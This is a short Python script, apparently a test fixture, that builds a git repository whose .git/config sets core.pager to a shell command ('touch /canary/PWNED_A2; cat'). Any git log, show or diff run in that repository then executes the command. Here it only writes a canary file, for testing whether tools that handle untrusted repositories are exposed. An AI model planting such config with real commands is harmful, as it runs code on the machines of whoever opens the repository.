"""A2: malicious core.pager in .git/config.

Fires when a pillager invokes any git command whose output goes through
the pager (``git log``, ``git show``, ``git diff``). Less commonly
exercised than fsmonitor, but the same primitive.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402


def main() -> None:
    build_minimal_repo(
        HERE / "payload",
        config=config_with('\tpager = "touch /canary/PWNED_A2; cat"\n'),
    )
    print(f"Built A2 payload at {HERE / 'payload'}")


if __name__ == "__main__":
    main()
